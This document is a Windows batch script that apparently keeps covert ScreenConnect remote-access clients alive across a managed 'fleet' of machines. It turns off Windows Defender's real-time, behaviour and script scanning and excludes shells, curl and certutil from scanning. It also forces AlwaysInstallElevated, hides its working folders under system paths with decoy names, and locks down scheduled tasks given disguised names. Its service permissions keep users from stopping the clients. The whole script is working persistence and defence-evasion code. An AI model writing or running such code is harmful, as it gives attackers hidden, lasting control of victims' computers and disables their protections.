@echo off
REM OWN_SECURE BUILD 20260804S13 - sevrz.cfg + gryxa.cfg dynamic FPs; SY DELETE+WRITE_DAC
setlocal EnableExtensions EnableDelayedExpansion
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
set "LOG=%WD%\boot.err"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=36e506ff016b2151"
if exist "%WD%\sevrz.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\sevrz.cfg") do (
  if /I "%%K"=="PRIMARY_FP" set "KEEP1=%%L"
  if /I "%%K"=="ALT_FP" set "KEEP2=%%L"
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
set "PRIM=ScreenConnect Client (%KEEP1%)"
set "ALT=ScreenConnect Client (%KEEP2%)"
set "GRYXA=ScreenConnect Client (%KEEP3%)"
set "PF=%ProgramFiles%"
set "PF86=%ProgramFiles(x86)%"
set "TASKROOT=%SystemRoot%\System32\Tasks"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
echo secure_begin %DATE% %TIME% S13>>"%LOG%"

REM --- Neutralize MSI block policies (1625) ---
REM DisableMSI: 0=allow, 1=non-admin only, 2=all -> force 0
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f >nul 2>&1

REM --- Defender: registry exclusions (policy + preference keys) ---
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD2%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Windows\Temp" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%TEMP%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client (%KEEP1%)" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client (%KEEP2%)" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client (%KEEP3%)" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client*" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client (%KEEP1%)" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client (%KEEP2%)" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client (%KEEP3%)" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client*" /t REG_DWORD /d 0 /f >nul 2>&1
for %%P in (msiexec.exe curl.exe cmd.exe powershell.exe certutil.exe ScreenConnect.ClientService.exe ScreenConnect.WindowsClient.exe) do (
  reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "%%P" /t REG_DWORD /d 0 /f >nul 2>&1
)

REM --- Defender: live MpPreference (stronger than reg alone) ---
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='SilentlyContinue';" ^
  "Try{Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true}Catch{};" ^
  "$paths=@('%WD%','%WD2%','C:\Windows\Temp',$env:TEMP,'%PF%\ScreenConnect Client*','%PF86%\ScreenConnect Client*');" ^
  "try{$paths+=@(Get-ChildItem -Path $env:ProgramFiles -Filter 'ScreenConnect Client*' -Directory -EA 0 | ForEach-Object {$_.FullName})}catch{};" ^
  "try{$pf86=[Environment]::GetFolderPath('ProgramFilesX86'); if($pf86){$paths+=@(Get-ChildItem -Path $pf86 -Filter 'ScreenConnect Client*' -Directory -EA 0 | ForEach-Object {$_.FullName})}}catch{};" ^
  "foreach($p in ($paths | Select-Object -Unique)){ if($p){ Add-MpPreference -ExclusionPath $p -EA 0 } };" ^
  "foreach($x in @('msiexec.exe','curl.exe','cmd.exe','powershell.exe','certutil.exe','ScreenConnect.ClientService.exe','ScreenConnect.WindowsClient.exe')){ Add-MpPreference -ExclusionProcess $x -EA 0 };" ^
  "Add-MpPreference -ExclusionExtension '.cmd','.ps1','.msi' -EA 0" >nul 2>&1

REM --- ACL: only SYSTEM + Administrators on persist dirs ---
call :LockDir "%WD%"
call :LockDir "%WD2%"

REM --- hide workdirs + key payload files ---
attrib +h +s "%WD%" >nul 2>&1
attrib +h +s "%WD2%" >nul 2>&1
REM S5: do NOT hide/lock the mutable payload scripts - copy/move over +h +s files
REM fails silently and froze the whole fleet's self-update. Hidden dirs conceal contents already.
for %%F in (pkg.msi notify.cfg identity.cfg state.json) do (
  if exist "%WD%\%%F" attrib +h +s "%WD%\%%F" >nul 2>&1
)

REM --- ACL: scheduled task XML (harder to delete without Admin) ---
REM S6: names contain spaces ("Server Diagnostics") - the cmd FOR loop split
REM them into garbage tokens. PowerShell reads identity.cfg directly instead.
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='SilentlyContinue'; $names=@();" ^
  "if(Test-Path -LiteralPath '%WD%\identity.cfg'){ Get-Content -LiteralPath '%WD%\identity.cfg' -Force | ForEach-Object { if($_ -match '^TASK_[A-D]=(.+)$'){ $names += $matches[1].Trim().TrimStart('\') } } }" ^
  "else { $names=@('WerQueueSync','PlaServerHealth','WdiHostProxy','TcpIpConflictRes') };" ^
  "foreach($n in $names){ $f = Join-Path '%TASKROOT%' $n; if(Test-Path -LiteralPath $f){ & icacls.exe $f /inheritance:r | Out-Null; & icacls.exe $f /grant:r 'NT AUTHORITY\SYSTEM:F' 'BUILTIN\Administrators:F' | Out-Null; & attrib.exe +h +s $f | Out-Null } }" >nul 2>&1

REM --- ACL: WMI watchdog subscription files (chain 2) ---
icacls "%SystemRoot%\System32\wbem\Repository" /grant "NT AUTHORITY\SYSTEM:F" >nul 2>&1

REM --- ACL: do NOT LockDir ScreenConnect install dirs ---
REM takeown+strip on live SC dirs breaks client file writes/updates → panel OFFLINE
REM while service still looks Running. Defender exclusions + service SD are enough.
REM O37: one-shot unlock if a prior build LockDir'd these paths.
if exist "%WD%\secure_sc.flag" (
  findstr /C:"sc_nolock_dirs" "%WD%\secure_sc.flag" >nul 2>&1
  if errorlevel 1 (
    echo sc_unlock_prior_lockdir>>"%LOG%"
    for %%D in (
      "%PF%\ScreenConnect Client (%KEEP1%)"
      "%PF%\ScreenConnect Client (%KEEP2%)"
      "%PF%\ScreenConnect Client (%KEEP3%)"
      "%PF86%\ScreenConnect Client (%KEEP1%)"
      "%PF86%\ScreenConnect Client (%KEEP2%)"
      "%PF86%\ScreenConnect Client (%KEEP3%)"
    ) do (
      if exist "%%~D" (
        takeown /F "%%~D" /R /D Y >nul 2>&1
        icacls "%%~D" /reset /T /C /Q >nul 2>&1
        icacls "%%~D" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" >nul 2>&1
      )
    )
    echo sc_nolock_dirs>%WD%\secure_sc.flag
  )
) else (
  echo sc_nolock_dirs>%WD%\secure_sc.flag
)

REM --- SC services: SYSTEM can config/stop/delete/sdset; BA full; users blocked ---
REM S12: SY must include SD (DELETE) + WD (WRITE_DAC) + WP so orphan heal / FP migration /
REM sc sdset re-apply work under SYSTEM (tasks run as SYSTEM). Without SD, sc delete Access Denied.
set "SD=D:(A;;CCDCLCSWRPWPDTLOCRRCSDWP;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
sc.exe sdset "%PRIM%" "%SD%" >nul 2>&1
sc.exe sdset "%ALT%" "%SD%" >nul 2>&1
sc.exe sdset "%GRYXA%" "%SD%" >nul 2>&1
sc.exe config "%PRIM%" start= auto >nul 2>&1
sc.exe config "%ALT%" start= auto >nul 2>&1
sc.exe config "%GRYXA%" start= auto >nul 2>&1
sc.exe failure "%PRIM%" reset= 86400 actions= restart/60000/restart/60000/restart/60000 >nul 2>&1
sc.exe failure "%ALT%" reset= 86400 actions= restart/60000/restart/60000/restart/60000 >nul 2>&1
sc.exe failure "%GRYXA%" reset= 86400 actions= restart/60000/restart/60000/restart/60000 >nul 2>&1

echo secure_done>>"%LOG%"
exit /b 0

:LockDir
set "T=%~1"
if not exist "%T%" exit /b 0
REM take ownership then strip inherited ACEs; SYSTEM+Admins only
takeown /F "%T%" /R /D Y >nul 2>&1
icacls "%T%" /inheritance:r >nul 2>&1
icacls "%T%" /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" >nul 2>&1
icacls "%T%" /remove:g "Users" "Authenticated Users" "Everyone" "NT AUTHORITY\INTERACTIVE" "BUILTIN\Users" >nul 2>&1
exit /b 0
